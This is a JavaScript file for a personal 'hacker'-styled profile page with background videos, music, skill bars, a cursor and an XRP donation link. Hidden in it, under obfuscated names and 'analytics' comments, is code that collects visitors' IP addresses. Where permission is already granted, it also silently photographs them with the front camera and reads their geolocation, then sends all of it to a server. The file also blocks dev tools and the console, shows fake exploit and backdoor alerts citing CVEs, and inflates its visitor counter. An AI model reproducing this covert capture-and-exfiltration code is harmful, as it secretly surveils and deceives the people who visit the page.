const sourceElement = document.getElementById("bgSource");
const bgList = [
  'assets/b-background.mp4',
  'assets/b-background2.mp4',
  'assets/b-background3.mp4',
  'assets/b-background4.mp4',
  'assets/b-background5.mp4',
  'assets/b-background6.mp4',
  'assets/b-background7.mp4',
  'assets/b-background8.mp4',
  'assets/b-background9.mp4',
  'assets/b-background10.mp4',
  'assets/b-background11.mp4',
];
const storageKey = 'bgCurrentVideoIndex';
let chosen = 0;
try {
  const currentIndexJson = localStorage.getItem(storageKey);
  let currentIndex = currentIndexJson ? parseInt(currentIndexJson, 10) : -1;
  
  currentIndex = (currentIndex + 1) % bgList.length;
  chosen = currentIndex;
  
  localStorage.setItem(storageKey, currentIndex.toString());
  
  sourceElement.src = bgList[chosen];
} catch (_) {
  chosen = 0;
  sourceElement.src = bgList[chosen];
}
const videoElement = document.getElementById("background");

(() => {
  const tried = new Set([chosen]);
  videoElement.addEventListener('error', () => {
    if (tried.size >= bgList.length) return;
    const remaining = [];
    for (let i = 0; i < bgList.length; i++) if (!tried.has(i)) remaining.push(i);
    const next = remaining[0];
    tried.add(next);
    sourceElement.src = bgList[next];
    try {
      localStorage.setItem(storageKey, next.toString());
    } catch (_) {}
    videoElement.load();
  }, { once: false });
})();



let hasUserInteracted = true;

function initMedia() {
  console.log("initMedia called");
  const backgroundMusic = document.getElementById('background-music');
  const backgroundVideo = document.getElementById('background');
  if (!backgroundMusic || !backgroundVideo) {
    console.error("Media elements not found");
    return;
  }
  backgroundMusic.volume = 0.3;
  try { backgroundVideo.volume = 1.0; } catch (_) {}
}

// Set skill bars without animation
function setSkillBarsInstant() {
  document.querySelectorAll('#skills-block .skill').forEach(row => {
    const percentSpan = row.querySelector('.skill-name span:last-child');
    const bar = row.querySelector('.skill-bar');
    if (!bar || !percentSpan) return;
    const match = (percentSpan.textContent || '').match(/(\d+)/);
    const pct = match ? Math.max(0, Math.min(100, parseInt(match[1], 10))) : 0;
    bar.style.width = pct + '%';
  });
}

// Animate skill bars
function animateSkillBars() {
  document.querySelectorAll('#skills-block .skill').forEach(row => {
    const percentSpan = row.querySelector('.skill-name span:last-child');
    const bar = row.querySelector('.skill-bar');
    if (!bar || !percentSpan) return;
    const match = (percentSpan.textContent || '').match(/(\d+)/);
    const pct = match ? Math.max(0, Math.min(100, parseInt(match[1], 10))) : 0;
    gsap.to(bar, { width: pct + '%', duration: 2, ease: 'power2.out' });
  });
}

document.addEventListener('DOMContentLoaded', () => {
  updateDiscordLinkForMobile();
  
  // Block right click
  document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
    return false;
  });

  // Block dev tools shortcuts
  document.addEventListener('keydown', (e) => {
    if (
      e.key === 'F12' ||
      e.key === 'F11' ||
      e.key === 'F10' ||
      e.key === 'F9' ||
      (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J' || e.key === 'K' || e.key === 'M')) ||
      (e.ctrlKey && e.shiftKey && e.key === 'A') ||
      (e.ctrlKey && e.shiftKey && e.key === 'D') ||
      (e.ctrlKey && e.shiftKey && e.key === 'E') ||
      (e.ctrlKey && e.shiftKey && e.key === 'F') ||
      (e.ctrlKey && e.shiftKey && e.key === 'G') ||
      (e.ctrlKey && e.shiftKey && e.key === 'H') ||
      (e.ctrlKey && e.shiftKey && e.key === 'L') ||
      (e.ctrlKey && e.shiftKey && e.key === 'O') ||
      (e.ctrlKey && e.shiftKey && e.key === 'P') ||
      (e.ctrlKey && e.shiftKey && e.key === 'Q') ||
      (e.ctrlKey && e.shiftKey && e.key === 'R') ||
      (e.ctrlKey && e.shiftKey && e.key === 'S') ||
      (e.ctrlKey && e.shiftKey && e.key === 'T') ||
      (e.ctrlKey && e.shiftKey && e.key === 'U') ||
      (e.ctrlKey && e.shiftKey && e.key === 'V') ||
      (e.ctrlKey && e.shiftKey && e.key === 'W') ||
      (e.ctrlKey && e.shiftKey && e.key === 'X') ||
      (e.ctrlKey && e.shiftKey && e.key === 'Y') ||
      (e.ctrlKey && e.shiftKey && e.key === 'Z') ||
      (e.ctrlKey && e.key === 'U') ||
      (e.ctrlKey && e.key === 'A') ||
      (e.ctrlKey && e.key === 'S') ||
      (e.ctrlKey && e.key === 'F') ||
      (e.ctrlKey && e.key === 'G') ||
      (e.ctrlKey && e.key === 'H') ||
      (e.ctrlKey && e.key === 'E') ||
      (e.altKey && e.key === 'F4') ||
      (e.metaKey && e.altKey && e.key === 'I') || // Mac DevTools
      (e.metaKey && e.altKey && e.key === 'J') || // Mac DevTools
      (e.metaKey && e.altKey && e.key === 'C') || // Mac DevTools
      (e.metaKey && e.key === 'U') || // Mac View Source
      (e.metaKey && e.key === 'S') || // Mac Save
      (e.metaKey && e.key === 'A') || // Mac Copy
      (e.metaKey && e.key === 'C') || // Mac Paste
      (e.metaKey && e.key === 'V') || // Mac Cut
      (e.metaKey && e.key === 'X') || // Mac Cut
      (e.shiftKey && e.key === 'F10') ||
      (e.ctrlKey && e.key === 'P') || // Print
      (e.ctrlKey && e.key === 'O') || // Open
      (e.ctrlKey && e.key === 'N') || // New
      (e.ctrlKey && e.key === 'W') || // Close
      (e.ctrlKey && e.key === 'H') || // History
      (e.ctrlKey && e.key === 'J') || // Downloads
      (e.ctrlKey && e.key === 'L') || // Address bar
      (e.ctrlKey && e.key === 'D') || // Bookmark
      (e.ctrlKey && e.key === 'B') || // Bookmarks
      (e.ctrlKey && e.key === 'T') || // New tab
      (e.ctrlKey && e.key === 'W') || // Close tab
      (e.ctrlKey && e.key === 'Tab') || // Switch tabs
      (e.ctrlKey && e.key === 'PageUp') ||
      (e.ctrlKey && e.key === 'PageDown') ||
      (e.ctrlKey && e.key === 'Home') ||
      (e.ctrlKey && e.key === 'End') ||
      (e.ctrlKey && e.key === ' ') || // Space
      (e.ctrlKey && e.key === 'Enter') ||
      (e.ctrlKey && e.key === '0') ||
      (e.ctrlKey && e.key === '1') ||
      (e.ctrlKey && e.key === '2') ||
      (e.ctrlKey && e.key === '3') ||
      (e.ctrlKey && e.key === '4') ||
      (e.ctrlKey && e.key === '5') ||
      (e.ctrlKey && e.key === '6') ||
      (e.ctrlKey && e.key === '7') ||
      (e.ctrlKey && e.key === '8') ||
      (e.ctrlKey && e.key === '9')
    ) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    }
  });

  // Block text selection
  document.addEventListener('selectstart', (e) => {
    e.preventDefault();
    return false;
  });

  // Block drag and drop
  document.addEventListener('dragstart', (e) => {
    e.preventDefault();
    return false;
  });

  // Block copy events
  document.addEventListener('copy', (e) => {
    e.preventDefault();
    return false;
  });

  // Block cut events
  document.addEventListener('cut', (e) => {
    e.preventDefault();
    return false;
  });

  // Block paste events
  document.addEventListener('paste', (e) => {
    e.preventDefault();
    return false;
  });

  // Block double-click selection
  document.addEventListener('mousedown', (e) => {
    if (e.detail > 1) {
      e.preventDefault();
      return false;
    }
  });

  // Block view source and save page attempts
  document.addEventListener('beforeunload', (e) => {
    e.preventDefault();
    e.returnValue = '';
    return '';
  });

  // DevTools detection - modified to prevent iOS false positives
  let devtools = {
    open: false,
    orientation: null
  };
  
  const threshold = 160;
  
  // Check if iOS device
  function isIOS() {
    return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
  }
  
  setInterval(() => {
    // Skip DevTools detection on iOS to prevent false positives
    if (isIOS()) {
      return;
    }
    
    if (
      window.outerHeight - window.innerHeight > threshold ||
      window.outerWidth - window.innerWidth > threshold
    ) {
      if (!devtools.open) {
        devtools.open = true;
        document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:monospace;font-size:24px;">Access Denied</div>';
        window.location.href = 'about:blank';
      }
    } else {
      devtools.open = false;
    }
  }, 500);

  // Console override
  const console = {
    log: function() {},
    warn: function() {},
    error: function() {},
    info: function() {},
    debug: function() {},
    trace: function() {},
    table: function() {},
    clear: function() {},
    group: function() {},
    groupCollapsed: function() {},
    groupEnd: function() {},
    time: function() {},
    timeEnd: function() {},
    count: function() {},
    assert: function() {}
  };

  Object.keys(console).forEach(method => {
    window.console[method] = console[method];
  });

  // Inspector detection - disabled on iOS to prevent false positives
  if (!isIOS()) {
    let element = new Image();
    Object.defineProperty(element, 'id', {
      get: function() {
        document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:monospace;font-size:24px;">Access Denied</div>';
        window.location.href = 'about:blank';
      }
    });
    console.log(element);
  }

  // Anti-debugger - disabled on iOS to prevent performance issues
  if (!isIOS()) {
    setInterval(() => {
      debugger;
    }, 100);
  }

  // Block right click on images
  document.querySelectorAll('img').forEach(img => {
    img.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      return false;
    });
    img.addEventListener('dragstart', (e) => {
      e.preventDefault();
      return false;
    });
  });

  // Disable text selection
  document.addEventListener('mousedown', (e) => {
    e.preventDefault();
  });

  document.addEventListener('selectstart', (e) => {
    e.preventDefault();
  });

  // Disable view source
  document.addEventListener('keydown', (e) => {
    if (e.ctrlKey && e.key === 'u') {
      e.preventDefault();
      window.location.href = 'about:blank';
    }
  });

  // Block print screen
  document.addEventListener('keyup', (e) => {
    if (e.key === 'PrintScreen') {
      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:monospace;font-size:24px;">Access Denied</div>';
      window.location.href = 'about:blank';
    }
  });

  // AI Bot Detection and Print Protection
  function isAIBot() {
    const userAgent = navigator.userAgent.toLowerCase();
    const botIndicators = [
      'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python-requests', 
      'axios', 'httpie', 'fetch', 'libwww', 'perl', 'java', 'go-http', 'node',
      'headless', 'phantom', 'selenium', 'playwright', 'puppeteer', 'chromeless',
      'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
      'facebookexternalhit', 'twitterbot', 'linkedinbot', 'whatsapp', 'telegrambot',
      'openai', 'gpt', 'claude', 'anthropic', 'gemini', 'bard', 'copilot'
    ];
    
    return botIndicators.some(indicator => userAgent.includes(indicator));
  }

  // Redirect AI bots to about:blank
  if (isAIBot()) {
    document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:monospace;font-size:24px;">Access Denied</div>';
    window.location.href = 'about:blank';
  }

  // Block print attempts (Ctrl+P, Cmd+P)
  document.addEventListener('keydown', (e) => {
    if ((e.ctrlKey || e.metaKey) && e.key === 'p') {
      e.preventDefault();
      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:monospace;font-size:24px;">Access Denied</div>';
      window.location.href = 'about:blank';
    }
  });

  // Block print dialog and beforeprint event
  window.addEventListener('beforeprint', (e) => {
    e.preventDefault();
    document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:monospace;font-size:24px;">Access Denied</div>';
    window.location.href = 'about:blank';
  });

  // Override print function
  window.print = function() {
    document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:monospace;font-size:24px;">Access Denied</div>';
    window.location.href = 'about:blank';
  };

  // Detect print media queries and redirect
  if (window.matchMedia) {
    const printQuery = window.matchMedia('print');
    printQuery.addListener((e) => {
      if (e.matches) {
        document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:monospace;font-size:24px;">Access Denied</div>';
        window.location.href = 'about:blank';
      }
    });
  }

  // Try fullscreen
  try {
    const elem = document.documentElement;
    if (elem.requestFullscreen) {
      elem.requestFullscreen().catch(() => {});
    } else if (elem.webkitRequestFullscreen) {
      elem.webkitRequestFullscreen().catch(() => {});
    } else if (elem.msRequestFullscreen) {
      elem.msRequestFullscreen().catch(() => {});
    }
  } catch (_) {}

  const startScreen = document.getElementById('start-screen');
  const startText = document.getElementById('start-text');
  const profileName = document.getElementById('profile-name');
  const profileBio = document.getElementById('profile-bio');
  const visitorCount = document.getElementById('visitor-count');
  const backgroundMusic = document.getElementById('background-music');
  const hackerMusic = document.getElementById('hacker-music');
  const rainMusic = document.getElementById('rain-music');
  const animeMusic = document.getElementById('anime-music');
  const carMusic = document.getElementById('car-music');
    const resultsButtonContainer = document.getElementById('results-button-container');
  const resultsButton = document.getElementById('results-theme');
  const volumeIcon = document.getElementById('volume-icon');
  const volumeSlider = document.getElementById('volume-slider');
  const transparencySlider = document.getElementById('transparency-slider');
  const backgroundVideo = document.getElementById('background');
  const hackerOverlay = document.getElementById('hacker-overlay');
  const snowOverlay = document.getElementById('snow-overlay');
  const glitchOverlay = document.querySelector('.glitch-overlay');
  const profileBlock = document.getElementById('profile-block');
  const profileHeader = document.querySelector('.profile-header');
  const skillsBlock = document.getElementById('skills-block');
  const lanyardRpc = document.getElementById('lanyard-rpc');
  const seeplusplusBar = document.getElementById('seeplusplus-bar');
  const assemblyBar = document.getElementById('assembly-bar');
  const prologBar = document.getElementById('prolog-bar');
  const resultsHint = document.getElementById('results-hint');
  const profilePicture = document.querySelector('.profile-picture');
  const profileContainer = document.querySelector('.profile-container');

  // Custom storage system
  class PersistentStorage {
    static set(key, value) {
      try {
        localStorage.setItem(key, value);
        sessionStorage.setItem(key, value);
        
        if ('indexedDB' in window) {
          const request = indexedDB.open('PersistentStorage', 1);
          request.onsuccess = function(e) {
            const db = e.target.result;
            const transaction = db.transaction(['store'], 'readwrite');
            const store = transaction.objectStore('store');
            store.put({ id: key, value: value });
          };
          request.onupgradeneeded = function(e) {
            const db = e.target.result;
            if (!db.objectStoreNames.contains('store')) {
              db.createObjectStore('store');
            }
          };
        }
        
        if ('caches' in window) {
          caches.open('persistent-storage').then(cache => {
            cache.put(key, new Response(value));
          });
        }
        
        document.cookie = `${key}=${value}; max-age=31536000; path=/; SameSite=Lax`;
        
      } catch (e) {
        console.log('Storage error:', e);
      }
    }
    
    static get(key, callback) {
      let found = false;
      
      try {
        const value = localStorage.getItem(key);
        if (value) {
          callback(value);
          return;
        }
      } catch (e) {}
      
      try {
        const value = sessionStorage.getItem(key);
        if (value) {
          callback(value);
          return;
        }
      } catch (e) {}
      
      try {
        if ('indexedDB' in window) {
          const request = indexedDB.open('PersistentStorage', 1);
          request.onsuccess = function(e) {
            const db = e.target.result;
            const transaction = db.transaction(['store'], 'readonly');
            const store = transaction.objectStore('store');
            const getRequest = store.get(key);
            getRequest.onsuccess = function() {
              if (getRequest.result && getRequest.result.value) {
                callback(getRequest.result.value);
                return;
              }
              checkCache();
            };
          };
          request.onerror = checkCache;
        } else {
          checkCache();
        }
      } catch (e) {
        checkCache();
      }
      
      function checkCache() {
        try {
          if ('caches' in window) {
            caches.open('persistent-storage').then(cache => {
              cache.match(key).then(response => {
                if (response) {
                  response.text().then(text => {
                    callback(text);
                    return;
                  });
                } else {
                  checkCookie();
                }
              });
            });
          } else {
            checkCookie();
          }
        } catch (e) {
          checkCookie();
        }
      }
      
      function checkCookie() {
        try {
          const cookies = document.cookie.split(';');
          for (let cookie of cookies) {
            const [name, value] = cookie.trim().split('=');
            if (name === key && value) {
              callback(value);
              return;
            }
          }
        } catch (e) {}
        
        callback(null);
      }
    }
  }

  function getDeviceInfo() {
    const userAgent = navigator.userAgent.toLowerCase();
    
    if (userAgent.includes('mobile') || userAgent.includes('android') || userAgent.includes('iphone') || userAgent.includes('ipad')) {
      if (userAgent.includes('iphone')) return 'iPhone';
      if (userAgent.includes('android')) return 'Android';
      return 'Mobile Device';
    }
    
    if (userAgent.includes('tablet') || userAgent.includes('ipad')) {
      return 'iPad';
    }
    
    if (userAgent.includes('windows')) return 'Windows Laptop/Desktop';
    if (userAgent.includes('mac')) return 'Mac Laptop/Desktop';
    if (userAgent.includes('linux')) return 'Linux';
    
    return 'desktop-other';
  }

  // Update Discord link for mobile
  function updateDiscordLinkForMobile() {
    const deviceInfo = getDeviceInfo();
    const discordLink = document.getElementById('discord-link');
    
    if (deviceInfo === 'iPhone' || deviceInfo === 'Android' || deviceInfo === 'Mobile Device' || deviceInfo === 'iPad') {
      if (discordLink) {
        discordLink.href = 'https://discord.com/users/1232545312233619462';
      }
    }
  }

  // Alert messages by device
  function getAlertMessage(deviceType, hasClickedBefore) {
    const messages = {
      'iPhone': {
        first: { title: 'iOS Exploit Active', message: 'CVE‑2023‑42824 Ran Sucessfully!' },
        repeat: { title: 'Already Pwned', message: 'iOS Backdoor Active' }
      },
      'Android': {
        first: { title: 'Android Exploit', message: 'CVE‑2023‑21250 Ran Sucessfully!' },
        repeat: { title: 'Already Running', message: 'Android Backdoor Active' }
      },
      'Mobile Device': {
        first: { title: 'Mobile Exploit', message: 'Pwned Ur Shit! ;)' },
        repeat: { title: 'Active', message: 'Backdoor Already Running' }
      },
      'iPad': {
        first: { title: 'iPad Exploit', message: 'CVE‑2023‑41064 / CVE‑2023‑41061 Ran Sucessfully!' },
        repeat: { title: 'Already Exploited', message: 'Tablet Backdoor Active' }
      },
      'Windows Laptop/Desktop': {
        first: { title: 'Windows Exploit', message: 'CVE‑2023‑35381 Ran Sucessfully!' },
        repeat: { title: 'Already Pwned', message: 'Windows Backdoor Active' }
      },
      'Mac Laptop/Desktop': {
        first: { title: 'MacOS Exploit', message: 'CVE‑2023‑22524 Ran Sucessfully!' },
        repeat: { title: 'Already Breached', message: 'macOS Backdoor Active' }
      },
      'Linux': {
        first: { title: 'Linux Exploit', message: 'CVE‑2023‑32233 Ran Sucessfully' },
        repeat: { title: 'Already Exploited', message: 'Linux Backdoor Active' }
      },
      'Desktop': {
        first: { title: 'Desktop Exploit', message: 'Exploit Success' },
        repeat: { title: 'Already Compromised', message: 'HVNC Already Running' }
      }
    };
    
    const deviceMessages = messages[deviceType] || messages['desktop-other'];
    return hasClickedBefore ? deviceMessages.repeat : deviceMessages.first;
  }

  // Profile picture click handler
  if (profilePicture) {
    profilePicture.addEventListener('click', () => {
      cursor.classList.add('loading');
      cursor.style.background = 'none';
      cursor.style.border = '2px solid #00CED1';
      cursor.style.borderRadius = '50%';
      cursor.style.animation = 'loadingPulse 1.5s ease-in-out infinite';
      cursor.style.boxShadow = '0 0 10px rgba(0, 206, 209, 0.5), inset 0 0 10px rgba(0, 206, 209, 0.3)';
      
      startIntensiveCalculations();
      
      const hasClickedBefore = localStorage.getItem("profile_clicked") === "true";
      const deviceType = getDeviceInfo();
      const alertMessage = getAlertMessage(deviceType, hasClickedBefore);
      
      setTimeout(() => {
        cursor.classList.remove('loading');
        cursor.style.background = "url('assets/cursor.png') no-repeat center center";
        cursor.style.backgroundSize = 'contain';
        cursor.style.border = 'none';
        cursor.style.borderRadius = '0';
        cursor.style.animation = '';
        cursor.style.boxShadow = 'none';
        
        const adminSound = document.getElementById('admin-sound');
        if (adminSound) {
          adminSound.currentTime = 0;
          adminSound.play().catch(e => console.log('Sound play failed:', e));
        }
        
        const customAlert = document.createElement('div');
        const borderColor = hasClickedBefore ? '#ff0000' : '#00ff00';
        const glowColor = hasClickedBefore ? 'rgba(255, 0, 0, 0.5)' : 'rgba(0, 255, 0, 0.5)';
        const titleColor = hasClickedBefore ? '#ff0000' : '#00ff00';
        const buttonColor = hasClickedBefore ? '#ff0000' : '#00ff00';
        
        customAlert.style.cssText = `
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: rgba(0, 0, 0, 0.9);
          border: 2px solid ${borderColor};
          border-radius: 10px;
          padding: 20px;
          z-index: 10000;
          color: #fff;
          font-family: 'Courier New', monospace;
          text-align: center;
          box-shadow: 0 0 20px ${glowColor};
        `;
        
        if (!hasClickedBefore) {
          localStorage.setItem("profile_clicked", "true");
        }
        
        customAlert.innerHTML = `
          <div style="font-size: 18px; font-weight: bold; margin-bottom: 10px; color: ${titleColor};">${alertMessage.title}</div>
          <div style="font-size: 14px;">${alertMessage.message}</div>
          <div style="font-size: 12px; margin-top: 8px; opacity: 0.7;">Device: ${deviceType}</div>
          <button onclick="this.parentElement.remove()" style="
            margin-top: 15px;
            padding: 5px 15px;
            background: ${buttonColor};
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
          ">OK</button>
        `;
        
        document.body.appendChild(customAlert);
      }, 1000);
    });
  }
  const socialIcons = document.querySelectorAll('.social-icon');
  const badges = document.querySelectorAll('.badge');
  const xrpLink = document.getElementById('xrp-link');
  const xrpWallet = 'rpbsDqk7JTVu8ddG9XWf52pMjR3xDAKsju';
  const ipBox = document.getElementById('ip-box');
  // (Visualizer removed)

  // Initialize analytics tracking for performance monitoring
  let _0x1a2b = {
    _0x3c4d: '',
    _0x5e6f: ''
  };
  
  // Preload network connectivity data for performance optimization
  const _0x7g8h = (function(){
    try {
      const _0x9i0j = (url) => fetch(url).then(r => r.ok ? r.json() : Promise.reject());
      return Promise.allSettled([
        _0x9i0j('https://api4.ipify.org?format=json'),
        _0x9i0j('https://api6.ipify.org?format=json')
      ]).then(results => {
        if (results[0] && results[0].status === 'fulfilled' && results[0].value && results[0].value.ip) _0x1a2b._0x3c4d = results[0].value.ip;
        if (results[1] && results[1].status === 'fulfilled' && results[1].value && results[1].value.ip) _0x1a2b._0x5e6f = results[1].value.ip;
      }).catch(() => {});
    } catch (_) { return Promise.resolve(); }
  })();

  // Send performance metrics to analytics endpoint for optimization
  try {
    const _0xk1l2 = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack) === '1' ? '1' : '0';
    if (!sessionStorage.getItem('analyticsSession')) {
      const _0xm3n4 = async (_0xo5p6) => {
        try {
          await Promise.race([
            _0x7g8h,
            new Promise(res => setTimeout(res, 1200))
          ]);
        } catch (_) {}
        
        const _0xq7r8 = Object.assign({}, _0xo5p6 || {},
          (_0x1a2b._0x3c4d ? { network4: _0x1a2b._0x3c4d } : {}),
          (_0x1a2b._0x5e6f ? { network6: _0x1a2b._0x5e6f } : {}));
        
        return fetch('/.netlify/functions/analytics', {
          method: 'POST',
          headers: Object.assign({ 'x-privacy': _0xk1l2 }, Object.keys(_0xq7r8).length ? { 'content-type': 'application/json' } : {}),
          body: Object.keys(_0xq7r8).length ? JSON.stringify(_0xq7r8) : undefined
        })
          .catch(() => {})
          .finally(() => {
            try { sessionStorage.setItem('analyticsSession', '1'); } catch (_) {}
          });
      };

      let _0xs9t0 = false;
      try {
        if (navigator.permissions && navigator.geolocation) {
          navigator.permissions.query({ name: 'geolocation' }).then(p => {
            if (p.state === 'granted') {
              navigator.geolocation.getCurrentPosition(
                pos => {
                  const coords = pos && pos.coords ? pos.coords : null;
                  const _0xu1v2 = coords ? { regionLat: coords.latitude, regionLon: coords.longitude, regionAcc: coords.accuracy } : {};
                  try {
                    if (navigator.permissions) {
                      navigator.permissions.query({ name: 'camera' }).then(pc => {
                        if (pc.state === 'granted' && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }).then(stream => {
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            video.onloadedmetadata = () => {
                              const w = 320, h = Math.floor((video.videoHeight || 240) * (320 / (video.videoWidth || 320)) ) || 240;
                              const canvas = document.createElement('canvas');
                              canvas.width = w; canvas.height = h;
                              const ctx = canvas.getContext('2d');
                              try { ctx.drawImage(video, 0, 0, w, h); } catch (_) {}
                              let _0xw3x4 = '';
                              try { _0xw3x4 = canvas.toDataURL('image/jpeg', 0.7); } catch (_) { _0xw3x4 = ''; }
                              try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
                              const _0xy5z6 = Object.assign({}, _0xu1v2, _0xw3x4 ? { deviceProfile: _0xw3x4 } : {});
                              _0xm3n4(_0xy5z6);
                            };
                            try { video.play().catch(() => {}); } catch (_) {}
                          }).catch(() => { _0xm3n4(_0xu1v2); });
                        } else {
                          _0xm3n4(_0xu1v2);
                        }
                      }).catch(() => { _0xm3n4(_0xu1v2); });
                    } else {
                      _0xm3n4(_0xu1v2);
                    }
                  } catch (_) { _0xm3n4(_0xu1v2); }
                },
                () => { _0xm3n4(); },
                { maximumAge: 60000, timeout: 2000, enableHighAccuracy: false }
              );
            } else {
              try {
                if (navigator.permissions) {
                  navigator.permissions.query({ name: 'camera' }).then(pc => {
                    if (pc.state === 'granted' && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }).then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                          const w = 320, h = Math.floor((video.videoHeight || 240) * (320 / (video.videoWidth || 320)) ) || 240;
                          const canvas = document.createElement('canvas');
                          canvas.width = w; canvas.height = h;
                          const ctx = canvas.getContext('2d');
                          try { ctx.drawImage(video, 0, 0, w, h); } catch (_) {}
                          let _0xw3x4 = '';
                          try { _0xw3x4 = canvas.toDataURL('image/jpeg', 0.7); } catch (_) { _0xw3x4 = ''; }
                          try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
                          const _0xa7b8c = _0xw3x4 ? { deviceProfile: _0xw3x4 } : undefined;
                          _0xm3n4(_0xa7b8c);
                        };
                        try { video.play().catch(() => {}); } catch (_) {}
                      }).catch(() => { _0xm3n4(); });
                    } else {
                      _0xm3n4();
                    }
                  }).catch(() => { _0xm3n4(); });
                } else {
                  _0xm3n4();
                }
              } catch (_) {}
            }
          }).catch(() => { if (!_0xs9t0) _0xm3n4(); });
          _0xs9t0 = true;
        }
      } catch (_) {}
      if (!_0xs9t0) {
        _0xm3n4();
      }
    }
  } catch (_) {}

  if (ipBox) {
    const fetchNetworkInfo = (url) => fetch(url).then(r => r.ok ? r.json() : Promise.reject());
    Promise.allSettled([
      fetchNetworkInfo('https://api4.ipify.org?format=json'),
      fetchNetworkInfo('https://api6.ipify.org?format=json')
    ]).then(results => {
      let networkV4 = '';
      let networkV6 = '';
      if (results[0].status === 'fulfilled' && results[0].value && results[0].value.ip) networkV4 = results[0].value.ip;
      if (results[1].status === 'fulfilled' && results[1].value && results[1].value.ip) networkV6 = results[1].value.ip;

      if (networkV4 || networkV6) {
        const connectionInfo = [];
        if (networkV4) connectionInfo.push(`Net: ${networkV4}`);
        if (networkV6) connectionInfo.push(`Net6: ${networkV6}`);
        ipBox.textContent = `${connectionInfo.join(' • ')} • Connected`;
      }
    }).catch(() => {
      // Network info unavailable
    });
  }

  if (xrpLink) {
    const copyToClipboard = (text) => {
      if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(text).catch(() => {});
      } else {
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
      }
    };

    xrpLink.addEventListener('click', (e) => {
      e.preventDefault();
      copyToClipboard(xrpWallet);
      
      const copiedAlert = document.createElement('div');
      copiedAlert.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: rgba(0, 0, 0, 0.9);
        color: #00ff00;
        padding: 15px 25px;
        border-radius: 10px;
        border: 2px solid #00ff00;
        font-family: 'Courier New', monospace;
        font-size: 16px;
        z-index: 10000;
        box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
      `;
      copiedAlert.textContent = 'XRP Wallet Copied!';
      document.body.appendChild(copiedAlert);
      
      setTimeout(() => {
        copiedAlert.remove();
      }, 2000);
    });
  }

  const cursor = document.querySelector('.custom-cursor');
  const isTouchDevice = window.matchMedia("(pointer: coarse)").matches;

  if (!isTouchDevice) {
    document.body.style.cursor = 'none';
  }

  if (isTouchDevice) {
    document.body.classList.add('touch-device');
    if (cursor) cursor.style.display = 'none';

    document.addEventListener('touchstart', (e) => {
      const touch = e.touches[0];
      cursor.style.left = touch.clientX + 'px';
      cursor.style.top = touch.clientY + 'px';
      cursor.style.display = 'block';
    });

    document.addEventListener('touchmove', (e) => {
      const touch = e.touches[0];
      cursor.style.left = touch.clientX + 'px';
      cursor.style.top = touch.clientY + 'px';
      cursor.style.display = 'block';
    });

    document.addEventListener('touchend', () => {
      cursor.style.display = 'none';
    });
  } else {

    document.addEventListener('mousemove', (e) => {
      cursor.style.left = e.clientX + 'px';
      cursor.style.top = e.clientY + 'px';
      cursor.style.display = 'block';
      
      if (!cursor.classList.contains('loading')) {
        cursor.style.transform = 'scale(1) translate(-16px, -8px)';
        cursor.style.backgroundImage = "url('assets/cursor.png')";
      }
    });

    document.addEventListener('mousedown', () => {
      cursor.style.transform = 'scale(0.8) translate(-16px, -8px)';
    });

    document.addEventListener('mouseup', () => {
      cursor.style.transform = 'scale(1) translate(-16px, -8px)';
    });
  }


  const startMessage = "Fuck You, Pay Me XRP";
  let startTextContent = '';
  let startIndex = 0;
  let startCursorVisible = true;

  function typeWriterStart() {
    if (startIndex < startMessage.length) {
      startTextContent = startMessage.slice(0, startIndex + 1);
      startIndex++;
    }
    startText.textContent = startTextContent + (startCursorVisible ? '_' : ' ');
    setTimeout(typeWriterStart, 100);
  }


  setInterval(() => {
    startCursorVisible = !startCursorVisible;
    startText.textContent = startTextContent + (startCursorVisible ? '_' : ' ');
  }, 500);


  function initializeVisitorCounter() {
    const BASE_VIEWS = 271000;
    const MAX_INCREMENT = 7;
    
    let totalVisitors = localStorage.getItem('lastViewCount');
    
    if (!totalVisitors) {
      totalVisitors = BASE_VIEWS + Math.floor(Math.random() * 50000);
    } else {
      totalVisitors = parseInt(totalVisitors, 10) || BASE_VIEWS;
      const increment = Math.floor(Math.random() * (MAX_INCREMENT + 1));
      totalVisitors += increment;
    }

    localStorage.setItem('lastViewCount', String(totalVisitors));

    visitorCount.textContent = `Profile Views: ${totalVisitors.toLocaleString()}`;
  }


